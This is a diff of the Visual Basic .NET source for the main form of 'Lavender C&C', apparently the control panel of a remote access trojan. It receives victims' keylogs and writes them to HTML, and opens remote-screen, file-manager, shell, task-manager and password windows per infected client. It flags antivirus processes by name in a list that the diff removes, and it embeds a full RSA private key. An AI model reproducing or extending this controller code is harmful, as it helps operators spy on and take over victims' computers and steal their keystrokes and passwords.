@@ -6,59 +6,87 @@ Imports System.Text
 Imports System.Runtime.InteropServices
 
 Public Class Main
+
+#Region "Initial Vars"
+    ''' <summary>
+    ''' Command variable values
+    ''' </summary>
     Public Shared n As New N
+    ''' <summary>
+    ''' TCP Client
+    ''' </summary>
     Dim sock As New TcpClient()
-    Dim ip As IPAddress = IPAddress.Parse("127.0.0.1")
-    Dim port As Integer = 6961
+    ''' <summary>
+    ''' Data separator
+    ''' </summary>
     Public Shared Sep As String = n.splitmain ''Separator
-    Public Sz As Size
+    ''' <summary>
+    ''' Can the application be closed (everything closed)
+    ''' </summary>
     Public CanClose As Boolean = True
+    ''' <summary>
+    ''' General tick timer
+    ''' </summary>
     Public WithEvents Second As New Timer
+    ''' <summary>
+    ''' Server instance
+    ''' </summary>
     Public WithEvents S As SocketServer
-    Public Shared pw As String ''todo: =nothing
+    ''' <summary>
+    ''' Client RC4 passwords in array by socket
+    ''' </summary>
+    Public Shared pw As String() ''todo: =nothing
+    ''' <summary>
+    ''' Number of clients
+    ''' </summary>
+    Public clientcount As Integer = 0
+    ''' <summary>
+    ''' Info label timeout
+    ''' </summary>
     Dim infotimeout As Integer
+    ''' <summary>
+    ''' Folder with applicatino exe
+    ''' </summary>
     Public cfr As String = My.Application.Info.DirectoryPath
+    ''' <summary>
+    ''' Current client's ID
+    ''' </summary>
     Public cid As String ''current id
-    Public cidf As String ''folder path for current client's files
-    Public klf As String 'keylogs file current id
-    Public pf As String ''profile folder
-    Public cpf As String ''current profile
-
+    ''' <summary>
+    ''' Current client's file folder
+    ''' </summary>
+    Public cidf As String
+    ''' <summary>
+    ''' Current keylogger file
+    ''' </summary>
+    Public klf As String
+    ''' <summary>
+    ''' Profiles folder
+    ''' </summary>
+    Public pf As String
+    ''' <summary>
+    ''' Current profile folder
+    ''' </summary>
+    Public cpf As String
+    ''' <summary>
+    ''' Profiles Array
+    ''' </summary>
+    Public Shared pfs As String()
+    ''' <summary>
+    ''' Current RSA private key
+    ''' </summary>
     Public cpk As String = "<RSAKeyValue><Modulus>oQS+MurZhAp2kYh7VWeyMZrwYmmpW5GYW+WW2V74YZqobBYkD6gTnI0XfOL2NRtv46IgYPZvB7mWG7af+hAYkb+0uUu/8DGJ2VAV1AyEKAzrv0bzXk10n28npYuE5jBvACl1Im+LNG8lgcNZe8AkPa1eVN6HrziD8GDgF+Ib+XCnUcA3piFf3mleVvyK2svUO2dFb2rYJTLpnIRkHHlO9wSbHIT51hcMmy9mZIG/O2xR7smtKHwEDFDIUor6BhCiWM2BBcHPzQEcL7qBL1Tie9Kd8CAB2YMRybaEWvU1rS1WNf+CBN2eWNGd3H5GTn8enZjG5szr7C5UV8HYDRPUGrnTsfVUUVQKKnn+DR4RusegfsWLCuIhfKkrZZWDmhw/WWgZWiAvbNl51rsqD1Cr8ILcOTgaOztXSoC0NkVCzDiNIqqeSZ+LhT+ML8G3TLe0C2noYomBEcG2QogC462dgT7mTO0OYaUnhV9DTiU0pPj9bXYfotnL0sLPM/FXBTK3O41resBiEeOKi2qMHsIQCyNRY7PnuFeb/y7MMWv+QPpGlcZoiN6t8ntoIZlYSdmVaAy8qOVs0Vfh8ZICXjkvmv68JnSCCOezbjxMOCiVbTpxxcDKThom1Km6n3gBOhuZjd6QJeXZwnQBpsKRcFD0UxkzlltaMFPItu3RyhAI/90=</Modulus><Exponent>AQAB</Exponent><P>w69HSoJX4ODudjPE4Kf63tsZ1TtcnHHE2DDpf9VRxto1zN8+0h+C/G4NQdELczcUfyhInVTXTbkSQSmHT8rpl7YEWZyAcXTeNSdTFYMqpMhpDDMomF5qnQbAEqpMCX9md3OY+qCm4qVv2r0m7wgKPdY3b8igFbYxllvy+ZQkPUFUAuzqeCSHRTA4hx966MbR01tVL87q+VqwYnQy8zEU/dg3ORYjhRhItkYDJ8wVJbPYlb7eFq0Scug85PTtZA8+mTFNDL4NBCQ2jOMthOPUsg5m7jTn3xjv3wJN7t5P3rEqsaFFehh9gioucBwdKasbnJNeU7yCKpD9mhm0hhGtsw==</P><Q>0qYXoK2MQHaKDcrfBp5P2GKY7CGvik2nmPiZIaIH8Bqx3pu8FQ15kU5ftwaxlsGY2OlBlwRNadTguiuZwZ/OdxJEvW4Qtor6CukPfw4nMhnwYKxgDaYXs5UVORa3DhD1/Nj26DvuPZuZ+6eUVHD+YntsnWwf8aZl+79MtLDskO3EqOZO3owTbI84J6Apg9loEfEJhnJmKEMGX1BZqbcJuhNGik1PU+KgSQaIVOe9yahP2c/1OB2c345sb41ldeBGhC/sFpOsebBY/rDdeueFybCvbkCnsm+9ryflEV1zcnKRzvpebR5m5Yg6i8cWkUkgZR6w2z6Pmhw45CYdVxd0Lw==</Q><DP>dkj6YAigFDgDDQJIDMCdfZ6VY/ZpCcwff8s5KeOJdhkrEjcUIzGXHP1tGA7DzBZMVnzEQA4rwziO10LCHzJ5txH4WS6n2W0acKjfqQ5LdaYLEavO6yOPcHHHIsE8CzWue6Atpbn8ht4X2fIimbSTdEOL6Q8t7VHfcZMNMV4h9cEKhmYtaQgzmFgIo20c/55G8Wqw+KAsGyR9oFW7ApP1q2fKIcDHIcnHEh8KA0FyuwKWdhYU60Ic98Z4ILII2UX5weIyP/SVq540Nz+PoVeSlzrrbywdyRaq0HP1JeHOB7+yHgNtGtu46jiTL4NfAXQD0cam6xj02cQg98h3/d6rzw==</DP><DQ>J4ZkvpBx1ZKoesgLKwm/f6GYgg4cCv5hKTHUQdxOUv4fS9663tRlcB9dlFEcN2ZiEKlL1lNHV0lLVYNi2VLsAama3lRtrGLNYgizEKsOLbdyRCFz8HuuzNJ3ZfveIzSJg4UOZyr/m+27ad3a1jFRehcgnTUxlT0cu6z8bpcX/GWw1eRI/jcYWfFRnxXNVGERxvQMTn7erkVNR8si19Zxa8m8Ha096kaGvs0L/apyEQmU2hDMOVhNHCF0NUY5uHF5qcn4KZBR949gU4HKPQp+LwcJE83r6W5QEDKTJ7v6MopO06Bk4WKn+f+ixKF5mY84FeE5XBoUBd2vyxdfv/y1nw==</DQ><InverseQ>hJOgraplojNz++cqefChHWb2BxmqkeH4SlTy9mMfLbKG0v3caofKBOHzvykbeRwoqtBxojipf43XsAo1bFfp2mU0Guv8leicWlwYmP9HX3IsekJb469v2Q/EgUYw3ySCCQw4uMRz+euKKWvJGpOOzPv1yY5eqIHfbSst/6hfBP4gkx6IKaSsh5zguM7UNs7nCdBCE1qinSHsHrGOCJ8E6yJqpnsHx3kYOxQEVxBEAGX6n87lerW5zoVHtDrGlrT6zt7C9dzNFWIjAWm8RWb33PxVCqc/SfKaPTs/QSbPXGGiNrv1BvuvbBwc8kqD1OQaNl2XuN63Kc9zsPGHAYvzew==</InverseQ><D>CcMlQPMKLKSk9N5G4MuzrkKlj/uCzOfYsLs/vrGwv3VgAFJrVBbg1+oAYlr98Gq+CUzhrhJ8ctLZ4TF2WFpN39a1DB+/ZSTe8n6V6p0dQH+TP3qVJykgO/zCQgAufSiy+8CHtuz3J9h63qr+xUj5KYaJJJe4hEAZ7iLORpE35V/i7rFUiACYAZhD1v3ivhc2wkJybEN/E7cXGmoDo9JON+qSLCCuNECB5cElWEyhhBnLvrCz8rNqKQQw0QhW1k1MR02jJLuc1kh0WNRzuda2Q8MzCviPaoxoZK42YhYuorxDJAaRiUTI5Lur8k7zNkkj8wwgBKUOwx5sw94fZwbGIjjYeaWXLDCAGXGmHAJT3T+xFCUT7Z2XLKj1b4W6XgeGHVU0b00gJiABcOSnykM54ewGc9jEOStuTQPrp6s7NSW/JvqsLYMmxCtaA/uLxPHvSypIAhkPvg0ICPCeHquAsObzrglsyxvEcyyK/T7GxowXUwb6AelRdk/Vz6Zm86x9fUsa+93lNSo4rsgNQqsXzdWqLXF8SEYQXHwq+kWjIudnaUV6ZnZozD3RC/RBAgPhyq1d6dUDKXevCtpnsmJpAUQzfhXt2hkiIQ0RbY0YJOcyicqJQZZvRRG5W0ou5Hl4uspGfvP2reqMvcMXYNouhGsX0exq+L0jPrgE+Py+PYU=</D></RSAKeyValue>" ''current private key
-
-    <DllImport("uxtheme", ExactSpelling:=True, CharSet:=CharSet.Unicode)>
-    Public Shared Function SetWindowTheme(hWnd As IntPtr, textSubAppName As [String], textSubIdList As [String]) As Int32 ''unthemed controls
-    End Function
-
-    Function Xord(ByVal str As String, ByVal key As String)
-        Dim i As Short
-        Xord = ""
-        Dim KeyChar As Integer
-        KeyChar = Asc(key)
-        For i = 1 To Len(str)
-            Xord &=
-               Chr(KeyChar Xor
-               Asc(Mid(str, i, 1)))
-        Next
-    End Function
-
-    'Sub Terminate()
-    '    If sock.Connected = True Then
-    '        InfoLabel.Text = "Sending terminate signal"
-    '        Dat(10, "0")
-    '        sock.Close()
-    '    End If
-    'End Sub
+#End Region
 
     Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
+        WriteToLog("Exiting application")
         My.Settings.Save()
-        If CanClose Then
-            ErrorLabel.Text = "Exiting"
-            S.stops()
-            Application.Exit()
-        Else
-            e.Cancel = True
-        End If
+        ErrorLabel.Text = "Exiting"
+        For Each x As ListViewItem In L1.Items
+            S.Disconnect(x.ToolTipText)
+        Next
+        S.stops()
+        Application.Exit()
     End Sub
 
 
@@ -70,12 +98,9 @@ Public Class Main
         Second.Start()
         ErrorLabel.Text = ""
         Tabs.Visible = False
-        PasswordTextbox.Text = pw
+        Tabs.SelectedTab = ManageTab
         ShowPasswordButton.BringToFront()
         ShowPasswordButton.Text = ""
-        ''vk.AssignControl(PasswordTextbox)
-
-
         pf = cfr & Path.DirectorySeparatorChar & "profiles"
         Try
             Dim di As New DirectoryInfo(pf)
@@ -85,8 +110,78 @@ Public Class Main
         Catch ex As Exception
             MsgBox("Profiles folder could not be created!" & vbNewLine & ex.Message)
         End Try
+
+        WriteToLog("Application started")
     End Sub
 
+    ''' <summary>
+    ''' Disable controls on client's forms that can communicate with the client
+    ''' </summary>
+    ''' <param name="sock">Form socket</param>
+    Public Sub FreezeForms(ByVal sock As String)
+        Try
+            If My.Application.OpenForms(n.opentaskman & sock) IsNot Nothing Then
+                Dim f As TaskMan = My.Application.OpenForms(n.opentaskman & sock)
+                disc(f.ContextMenu)
+                disc(f.KillButton)
+                disc(f.RefreshButton)
+                disc(f.NewButton)
+            End If
+            If My.Application.OpenForms(n.openklog & sock) IsNot Nothing Then
+                Dim f As KeyLogger = My.Application.OpenForms(n.openklog & sock)
+                disc(f.RefreshButton)
+                disc(f.ClearButton)
+            End If
+            If My.Application.OpenForms(n.openutil & sock) IsNot Nothing Then
+                Dim f As Utilities = My.Application.OpenForms(n.openutil & sock)
+                disc(f)
+            End If
+            If My.Application.OpenForms(n.openpasswords & sock) IsNot Nothing Then
+                Dim f As Passwords = My.Application.OpenForms(n.openpasswords & sock)
+                ''Nothing for now
+            End If
+            If My.Application.OpenForms(n.openscreen & sock) IsNot Nothing Then
+                Dim f As Remote = My.Application.OpenForms(n.openscreen & sock)
+                disc(f.ToggleButton)
+                disc(f.M)
+                disc(f.C1)
+                disc(f.C2)
+                disc(f.C)
+                disc(f.LinesCheckBox)
+                disc(f.MouseCheckBox)
+                disc(f.KeyboardCheckBox)
+            End If
+            If My.Application.OpenForms(n.openfileman & sock) IsNot Nothing Then
+                Dim f As FileManager = My.Application.OpenForms(n.openfileman & sock)
+                disc(f.HomeButton)
+                disc(f.RefreshButton)
+                disc(f.UpButton)
+                disc(f.GoButton)
+                disc(f.DirTextBox)
+                disc(f.FileContextMenuStrip)
+            End If
+            If My.Application.OpenForms(n.openshell & sock) IsNot Nothing Then
+                Dim f As Shell = My.Application.OpenForms(n.openshell & sock)
+                disc(f.CommandTextBox)
+            End If
+        Catch ex As Exception
+            MsgBox(ex.Message)
+        End Try
+    End Sub
+
+    ''' <summary>
+    ''' Disable a control
+    ''' </summary>
+    ''' <param name="c">Control to disable</param>
+    Private Sub disc(ByVal c As Control)
+        c.Enabled = False
+    End Sub
+
+    ''' <summary>
+    ''' Timer
+    ''' </summary>
+    ''' <param name="sender"></param>
+    ''' <param name="e"></param>
     Private Sub Second_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Second.Tick
         ''Get port from settings
         If Spinner.Visible = True Then
@@ -96,7 +191,14 @@ Public Class Main
         End If
     End Sub
 
-    Private Sub Main_Shown(sender As Object, e As EventArgs) Handles MyBase.Shown
+    ''' <summary>
+    ''' Print message to the log
+    ''' </summary>
+    ''' <param name="message">Message to print</param>
+    Public Sub WriteToLog(ByVal message As String)
+        Dim oo = My.Computer.Clock.LocalTime
+        LogTextBox.Text += "[" & oo.Year & "/" & oo.Month & "/" & oo.Day & " " & New String(oo.Hour.ToString).PadLeft(2, "0") & ":" & New String(oo.Minute.ToString).PadLeft(2, "0") & ":" & New String(oo.Second.ToString).PadLeft(2, "0") & "] " & message & vbNewLine
+        ''TODO: scroll to bottom
     End Sub
 
 #Region "Server Events"
@@ -107,12 +209,15 @@ Public Class Main
     ''' <remarks></remarks>
     Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected
         Try
+            clientcount -= 1
+            WriteToLog("Client """ & L1.Items(sock.ToString).SubItems(0).Text & """ disconnected")
             L1.Items(sock.ToString).Remove()
             If trust.Contains(sock) Then
                 trust.Remove(sock)
             End If
         Catch ex As Exception
         End Try
+        FreezeForms(sock)
     End Sub
     ''' <summary>
     ''' Handles client connect
@@ -120,12 +225,27 @@ Public Class Main
     ''' <param name="sock">Socket</param>
     ''' <remarks></remarks>
     Sub Connected(ByVal sock As Integer) Handles S.Connected
-        S.Send(sock, N.connect) ' Authentication initalization
+        clientcount += 1
+        Dim largest As Integer = clientcount ''largest socket number
+        Dim socks As Integer()
+        Dim i As Integer = 0
+        For Each x As ListViewItem In L1.SelectedItems
+            ReDim Preserve socks(i)
+            socks(i) = Integer.Parse(x.ToolTipText)
+            For Each socket As Integer In socks
+                If socket > largest Then
+                    largest = socket
+                End If
+            Next
+        Next
+        ReDim Preserve pw(largest)
+
+        S.Send(sock, n.connect) ' Authentication initalization
     End Sub
 
     Delegate Sub _Datad(ByVal info As Data)
     ''' <summary>
-    ''' Handles data recieved?
+    ''' Handles data recieved from clients
     ''' </summary>
     ''' <param name="info">Data</param>
     ''' <remarks></remarks>
@@ -145,7 +265,7 @@ Public Class Main
 
     Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
     ''' <summary>
-    ''' Handles data recieved
+    ''' Handles commands/data recieved from clients
     ''' </summary>
     ''' <param name="sock">Socket</param>
     ''' <param name="B">Data as bytes</param>
@@ -153,13 +273,13 @@ Public Class Main
     Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
         Dim T As String
         If trust.Contains(sock) Then
-            T = Crypt.RC4.rc4(BS(B), pw)
+            T = Crypt.RC4.rc4(BS(B), pw(sock)) ''decrypt data using RC4
         Else
             T = BS(B)
         End If
 
         Dim A As String() = Split(T, Sep)
-        If Split(BS(B), Sep)(0) = n.getscreen Then ''if screen data
+        If Split(BS(B), Sep)(0) = n.getscreen Then ''if remote screen data
             T = BS(B)
             A = Split(T, Sep)
         End If
@@ -167,9 +287,9 @@ Public Class Main
             Select Case A(0)
                 Case n.connect ''authentication check
                     Dim rk As Crypt.RSAResult = New Crypt.RSAResult(Convert.FromBase64String(A(1)))
-                    pw = Crypt.RSA.Decrypt(rk.AsBytes, cpk).AsString
-                    PasswordTextbox.Text = pw
-                    S.Send(sock, n.response & Sep & Crypt.HMACSHA512Hasher.Base64Hash(pw))
+                    pw(sock) = Crypt.RSA.Decrypt(rk.AsBytes, cpk).AsString
+                    PasswordTextbox.Text = pw(sock)
+                    S.Send(sock, n.response & Sep & Crypt.HMACSHA512Hasher.Base64Hash(pw(sock)))
                 Case n.response ''successfully authenticated
                     trust.Add(sock)
                     'For Each tt As Integer In trust
@@ -188,8 +308,10 @@ Public Class Main
                             Using rdr As New DatabaseReader("GeoLite2-Country.mmdb")
                                 L.SubItems.Add(rdr.Country(S.IP(sock)).Country.Name)
                                 L.ImageKey = rdr.Country(S.IP(sock)).Country.IsoCode & ".png"
+                                ''rdr.
                             End Using
                         Catch ex As Exception
+                            L.ImageKey = "zz.png" ''TODO: country to ISO
                             L.SubItems.Add("(" & A(3) & ")")
                         End Try
 
@@ -204,6 +326,8 @@ Public Class Main
                         TrayIcon.BalloonTipTitle = "Lavender C&C"
                         TrayIcon.BalloonTipText = "Client connected: [ ID : " & A(1) & " IP : " & S.IP(sock) & " Country : " & A(3) & " ]"
                         TrayIcon.ShowBalloonTip(1)
+
+                        WriteToLog("Client """ & A(1) & """ connected")
                     End If
                 Case n.activewindow ''active window
                     For i As Integer = 0 To L1.Items.Count - 1
@@ -243,26 +367,16 @@ Public Class Main
                     f.Name = n.openklog & sock ''name of new window
                     f.Text = f.Text & S.IP(sock) ''title += ip
                     f.Show() ''show
-
-                ''todo??/
-                ' Case "logf"
-                '    Dim F As Form7 = My.Application.OpenForms("openlo" & sock)
-                '   Dim logsf As String() = Split(A(1), "|")
-                '  For i As Integer = 0 To logsf.Length - 2
-                'Dim ii As New ListViewItem
-                'ii.Text = logsf(i)
-                'f.ListView1.Items.Add(ii)
-                'Next
-
                 Case n.getklog ''set keylogger texbox to keylogs
                     Dim F As KeyLogger = My.Application.OpenForms(n.openklog & sock) ''find window from socket
                     klf = cidf & Path.DirectorySeparatorChar & "keylogs.html"
                     Dim final As String = A(1)
-                    final = A(1).Insert(0, "<html style=""font-family:Segoe UI, Helvetica Neue, Arial, sans-serif""><head><title>" & L1.Items(sock.ToString).SubItems(2).Text & "|" & S.IP(sock) & "</title></head><body><style>.k { color:#080; } .f { color:#F80; }</style><h1 style=""text-align:center; color: #B07;"">" & L1.Items(sock.ToString).SubItems(2).Text & " | " & S.IP(sock) & "</h1>")
+                    final = A(1).Insert(0, "<html style=""font-family:Segoe UI, Helvetica Neue, Arial, sans-serif""><head><title>" & L1.Items(sock.ToString).SubItems(2).Text & " | " & S.IP(sock) & "</title></head><body><style>.k { color:#080; } .f { color:#F80; }</style><h1 style=""text-align:center; color: #B07;"">" & L1.Items(sock.ToString).SubItems(2).Text & " | " & S.IP(sock) & "</h1>")
                     final = final.Insert(final.Length, "</body><html>")
                     IO.File.WriteAllText(klf, final, Encoding.UTF8) ''write keylogs to file
-
                     F.WebBrowser.DocumentText = IO.File.ReadAllText(klf).ToString ''set browser component to log file
+                    F.WebBrowser.Invalidate()
+                ''F.WebBrowser.Document.Body.ScrollIntoView(False)
                 Case n.delklog
                     MsgBox("Logs deleted from host")
                 Case n.openfileman
@@ -334,32 +448,17 @@ Public Class Main
 
                     If F IsNot Nothing Then
                         If A(1).Length = 1 Then
-                            F.filesize = siz(B.Length)
-                            F.changes = "None"
-                            If F.active Then
-                                S.Send(sock, n.getscreen & Sep & F.C1.SelectedIndex & Sep & F.C2.Text & Sep & F.C.Value)
+                            If Not F.changes = "None" Then
+                                F.changes = "None"
+                                F.filesize = siz(B.Length)
+                                F.UpdateInfo(False)
                             End If
+                            S.Send(sock, n.getscreen & Sep & F.C1.SelectedIndex & Sep & F.C2.Text & Sep & F.C.Value)
                             Exit Sub
                         End If
                         Dim BB As Byte() = fx(B, n.getscreen & Sep)(1)
                         F.PktToImage(BB)
                     End If
-                ''For now fuck text to speech shit
-                'Case "opentto"
-                '    If My.Application.OpenForms("opentto" & sock) IsNot Nothing Then Exit Sub
-                '    If Me.InvokeRequired Then
-                '        Dim j As New _Data(AddressOf data)
-                '        Me.Invoke(j, New Object() {sock, B})
-                '        Exit Sub
-                '    End If
-                '    Dim f As New Form10
-
-                '    f.sock = sock
-                '    f.Name = "opentto" & sock
-                '    f.Text = f.Text + S.IP(sock)
-                '    f.Show()
-
-
                 Case n.getfileman
                     Dim fff As FileManager = My.Application.OpenForms(n.openfileman & sock)
                     If A(1) = "Error" Then
@@ -528,73 +627,7 @@ Public Class Main
 
                                 Dim antivirus As String = ""
 
-                                ''stupid but necessary. TODO: fix
-                                If allProcess(i).ToLower = "ekrn" Then
-                                    antivirus = "NOD32"
-                                ElseIf allProcess(i).ToLower = "avgcc" Then
-                                    antivirus = "AVG"
-                                ElseIf allProcess(i).ToLower = "avgnt" Then
-                                    antivirus = "Avira"
-                                ElseIf allProcess(i).ToLower = "ahnsd" Then
-                                    antivirus = "AhnLab-V3"
-                                ElseIf allProcess(i).ToLower = "bdss" Then
-                                    antivirus = "BitDefender"
-                                ElseIf allProcess(i).ToLower = "bdv" Then
-                                    antivirus = "ByteHero"
-                                ElseIf allProcess(i).ToLower = "clamav" Then
-                                    antivirus = "ClamAV"
-                                ElseIf allProcess(i).ToLower = "fpavserver" Then
-                                    antivirus = "F-Prot"
-                                ElseIf allProcess(i).ToLower = "fssm32" Then
-                                    antivirus = "F-Secure"
-                                ElseIf allProcess(i).ToLower = "avkcl" Then
-                                    antivirus = "GData"
-                                ElseIf allProcess(i).ToLower = "engface" Then
-                                    antivirus = "Jiangmin"
-                                ElseIf allProcess(i).ToLower = "avp" Then
-                                    antivirus = "Kaspersky"
-                                ElseIf allProcess(i).ToLower = "updaterui" Then
-                                    antivirus = "McAfee"
-                                ElseIf allProcess(i).ToLower = "msmpeng" Then
-                                    antivirus = "MSE/Defender"
-                                ElseIf allProcess(i).ToLower = "zanda" Then
-                                    antivirus = "Norman"
-                                ElseIf allProcess(i).ToLower = "npupdate" Then
-                                    antivirus = "nProtect"
-                                ElseIf allProcess(i).ToLower = "inicio" Then
-                                    antivirus = "Panda"
-                                ElseIf allProcess(i).ToLower = "sagui" Then
-                                    antivirus = "Prevx"
-                                ElseIf allProcess(i).ToLower = "Norman" Then
-                                    antivirus = "Sophos"
-                                ElseIf allProcess(i).ToLower = "savservice" Then
-                                    antivirus = "Sophos"
-                                ElseIf allProcess(i).ToLower = "saswinlo" Then
-                                    antivirus = "SUPERAntiSpyware"
-                                ElseIf allProcess(i).ToLower = "spbbcsvc" Then
-                                    antivirus = "Symantec"
-                                ElseIf allProcess(i).ToLower = "thd32" Then
-                                    antivirus = "TheHacker"
-                                ElseIf allProcess(i).ToLower = "ufseagnt" Then
-                                    antivirus = "TrendMicro"
-                                ElseIf allProcess(i).ToLower = "dllhook" Then
-                                    antivirus = "VBA32"
-                                ElseIf allProcess(i).ToLower = "sbamtray" Then
-                                    antivirus = "VIPRE"
-                                ElseIf allProcess(i).ToLower = "vrmonsvc" Then
-                                    antivirus = "ViRobot"
-                                ElseIf allProcess(i).ToLower = "vbcalrt" Then
-                                    antivirus = "VirusBuster"
-                                ElseIf allProcess(i).ToLower = "mbam" Then
-                                    antivirus = "Malwarebytes Anti-Malware GUI"
-                                ElseIf allProcess(i).ToLower = "mbamresearch" Then
-                                    antivirus = "Malwarebytes Anti-Malware"
-                                ElseIf allProcess(i).ToLower = "mbamservice" Then
-                                    antivirus = "Malwarebytes Anti-Malware Service"
-                                Else
-                                    antivirus = ""
-                                End If
-
+                                GetAV(allProcess(i).ToLower)
                                 If Not antivirus = "" Then
                                     itm.BackColor = Color.LightSalmon
                                     itm.ToolTipText = "Antivirus Program: " & antivirus
@@ -721,6 +754,11 @@ Public Class Main
 
 #End Region
 
+    ''' <summary>
+    ''' Convert a percentage into a shade of yellow
+    ''' </summary>
+    ''' <param name="per">Percentage</param>
+    ''' <returns></returns>
     Function PercentColor(ByVal per As Double) As Color
         If per > 50 Then
             Return Color.FromArgb(255, 55, 5)
@@ -738,25 +776,17 @@ Public Class Main
     End Function
 
 
+    ''' <summary>
+    ''' Convert bytes to a bitmap icon
+    ''' </summary>
+    ''' <param name="bytes"></param>
+    ''' <returns></returns>
     Function BytesToIcon(bytes As Byte()) As Bitmap
         Using ms As New MemoryStream(bytes)
             Return New Bitmap(ms) ''.RawFormat(System.Drawing.Imaging.ImageFormat.Png)
         End Using
     End Function
 
-    Private Sub SendButton_Click(sender As Object, e As EventArgs)  ''Send Process.start() command
-        ''Sp(True)
-        'If CommandTextbox.Text = "" Then
-        '    ErrorLabel.Text = "Command field empty"
-        'Else
-        '    Dat(0, CommandTextbox.Text)
-        'End If
-        'Sp(False)
-        'For Each x As ListViewItem In L1.SelectedItems
-        '    S.Send(x.ToolTipText, "Execute" & Main.Sep & CommandTextbox.Text)
-        'Next
-
-    End Sub
 #Region "Power Buttons"
     Private Sub ShutdownButton_Click(sender As Object, e As EventArgs) Handles ShutdownButton.Click
         For Each x As ListViewItem In L1.SelectedItems
@@ -789,54 +819,9 @@ Public Class Main
     End Sub
 #End Region
 
+#Region "View/Client Control Button Events"
     Private Sub PViewButton_Click(sender As Object, e As EventArgs)
         TaskMan.Show()
-    End Sub
-
-    Private Sub MsgSendButton_Click(sender As Object, e As EventArgs) Handles MsgSendButton.Click  ''Send messagebox
-        Dim mbmsg As String = MsgTextbox.Text
-        Dim mbtp As String ''MsgBoxStyle
-        If InfoRadio.Checked Then mbtp = "i" Else If ExclaRadio.Checked Then mbtp = "w" Else If QuestRadio.Checked Then mbtp = "q" Else If CritRadio.Checked Then mbtp = "e"
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.message & Sep & mbmsg & Sep & mbtp.ToString)
-        Next
-    End Sub
-
-    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
-        'If ShowDesktopCheckbox.Checked Then
-        '    For Each x As ListViewItem In L1.SelectedItems
-        '        If L1.SelectedItems.Count = 1 Then
-        '            S.Send(x.ToolTipText, "!!")
-        '        End If
-        '    Next
-        'End If
-        If L1.SelectedItems.Count >= 1 Then
-            Tabs.Enabled = True
-            Tabs.Visible = True
-
-            cid = L1.SelectedItems.Item(0).SubItems(0).Text ''set cid to current client's ID
-            cidf = cfr & Path.DirectorySeparatorChar & "hosts"
-            Try
-                Dim di As New DirectoryInfo(cidf)
-                If Not di.Exists Then
-                    di.Create()
-                End If
-            Catch ex As Exception
-                MsgBox("Hosts folder could not be created!" & vbNewLine & ex.Message)
-            End Try
-            cidf = cfr & Path.DirectorySeparatorChar & "hosts" & Path.DirectorySeparatorChar & cid
-            Try
-                Dim di As New DirectoryInfo(cidf)
-                If Not di.Exists Then
-                    di.Create()
-                End If
-            Catch ex As Exception
-                MsgBox("Hosts/current subfolder could not be created!" & vbNewLine & ex.Message)
-            End Try
-        Else
-            Tabs.Enabled = False
-            Tabs.Visible = False
-        End If
     End Sub
 
     Private Sub FileButton_Click(sender As Object, e As EventArgs) Handles FileButton.Click
@@ -869,8 +854,6 @@ Public Class Main
         Next
     End Sub
 
-
-
     Private Sub ExitButton_Click(sender As Object, e As EventArgs) Handles ExitButton.Click
         For Each x As ListViewItem In L1.SelectedItems
             S.Send(x.ToolTipText, n.close)
@@ -883,6 +866,81 @@ Public Class Main
         Next
     End Sub
 
+    Private Sub MsgSendButton_Click(sender As Object, e As EventArgs) Handles MsgSendButton.Click  ''Send messagebox
+        Dim mbmsg As String = MsgTextbox.Text
+        Dim mbtp As String ''MsgBoxStyle
+        If InfoRadio.Checked Then mbtp = "i" Else If ExclaRadio.Checked Then mbtp = "w" Else If QuestRadio.Checked Then mbtp = "q" Else If CritRadio.Checked Then mbtp = "e"
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.ToolTipText, n.message & Sep & mbmsg & Sep & mbtp.ToString)
+        Next
+    End Sub
+
+    Private Sub TaskmanButton_Click(sender As Object, e As EventArgs) Handles TaskmanButton.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.ToolTipText, n.opentaskman)
+        Next
+    End Sub
+
+    Private Sub RetrieveButton_Click(sender As Object, e As EventArgs) Handles RetrieveButton.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.ToolTipText, n.getspecs)
+        Next
+    End Sub
+
+    Private Sub Tabs_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Tabs.SelectedIndexChanged
+        Tabs.SelectedTab.Refresh()
+    End Sub
+
+    Private Sub ReconnectButton_Click(sender As Object, e As EventArgs) Handles ReconnectButton.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.ToolTipText, n.reconnect)
+        Next
+    End Sub
+
+    Private Sub ShellButton_Click(sender As Object, e As EventArgs) Handles ShellButton.Click
+        For Each x As ListViewItem In L1.SelectedItems
+            S.Send(x.ToolTipText, n.openshell)
+        Next
+    End Sub
+#End Region
+
+    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
+        If L1.SelectedItems.Count >= 1 Then
+            Tabs.Enabled = True
+            Tabs.Visible = True
+            CurrentClientChange(L1.SelectedItems.Item(0).SubItems(0).Text)
+        Else
+            Tabs.Enabled = False
+            Tabs.Visible = False
+        End If
+    End Sub
+
+    ''' <summary>
+    ''' Update directory variables to current client's
+    ''' </summary>
+    ''' <param name="client">Client ID/Name</param>
+    Public Sub CurrentClientChange(ByVal client As String)
+        cid = client ''set cid to current client's ID
+        cidf = cfr & Path.DirectorySeparatorChar & "hosts"
+        Try
+            Dim di As New DirectoryInfo(cidf)
+            If Not di.Exists Then
+                di.Create()
+            End If
+        Catch ex As Exception
+            MsgBox("Hosts folder could not be created!" & vbNewLine & ex.Message)
+        End Try
+        cidf = cfr & Path.DirectorySeparatorChar & "hosts" & Path.DirectorySeparatorChar & cid
+        Try
+            Dim di As New DirectoryInfo(cidf)
+            If Not di.Exists Then
+                di.Create()
+            End If
+        Catch ex As Exception
+            MsgBox("Hosts/current subfolder could not be created!" & vbNewLine & ex.Message)
+        End Try
+    End Sub
+
     Private Sub ListenButton_Click(sender As Object, e As EventArgs) Handles ListenButton.Click
         PasswordTextbox.BackColor = Color.Black
         If PasswordTextbox.Text.Length = 0 Then
@@ -891,21 +949,23 @@ Public Class Main
             PasswordTextbox.BackColor = Color.DarkRed
